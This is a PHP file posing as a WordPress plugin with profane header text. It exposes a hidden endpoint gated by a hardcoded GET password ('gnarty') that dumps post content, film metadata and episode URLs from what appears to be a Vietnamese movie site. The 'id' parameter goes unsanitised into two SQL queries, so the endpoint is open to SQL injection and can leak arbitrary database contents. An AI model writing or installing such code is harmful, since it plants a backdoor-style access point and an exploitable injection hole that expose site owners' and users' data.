<?php
/*
Plugin Name: Mother Fucker
Plugin URI: http://fuck.org
Description: fuck my ass
Author: gnarty
Version: 100.6
Author URI: http://fuck.org
*/
include('../../wp-load.php');
global $wpdb;
$pass = ((isset($_GET['key'])) ? $_GET['key'] : '');
$id = ((isset($_GET['id'])) ? $_GET['id'] : '');
if($pass == 'gnarty')
{
	global $wpdb;

	$info = $wpdb->get_results("SELECT * FROM " . $wpdb->prefix . "posts WHERE ID = '".$id."'");
	
	$info = $info[0];
	$return = array(
		'id' => $id,
		'title'	=>	$info->post_title,
		'content'	=>	$info->post_content,
		'phim_en'	=>	get_post_meta( $id, 'phim_en', true ),
		'phim_hd'	=>	get_post_meta( $id, 'phim_hd', true ),
		'phim_nsx'	=>	get_post_meta( $id, 'phim_nsx', true ),
		'phim_tl'	=>	get_post_meta( $id, 'phim_tl', true ),
		'image'		=>  get_post_meta( $id, 'Image', true ),
		'tags'		=>	implode(',', fuck_filter_term(get_the_tags($id))),
		'dien-vien'	=> implode(',', fuck_filter_term(wp_get_post_terms( $id, 'dien-vien'))),
		'episode'	=> fuck_get_episode($id),
	);
	//print_r($return);
	echo serialize($return);
}
else
{
	exit('<img src="http://pagunview.com/wp-content/uploads/sites/43/2014/01/fuck-you.jpg" />');
}
function fuck_filter_term($object)
{
	$r = array();
	foreach ($object as $key => $value) 
	{
		$r[] = $value->name;
	}
	return $r;
}
function fuck_get_episode($id)
{
	$r = array();
	global $wpdb;
	$sql = $wpdb->get_results("SELECT * FROM ".$wpdb->prefix."film_episode WHERE episode_film = '".$id."' ORDER BY episode_id ASC");
	foreach ($sql as $key => $value) 
	{
		//print_r($value);exit();
		$r[$key]['name'] = $value->episode_name;
		$r[$key]['url'] = $value->episode_url;
	}
	return $r;
}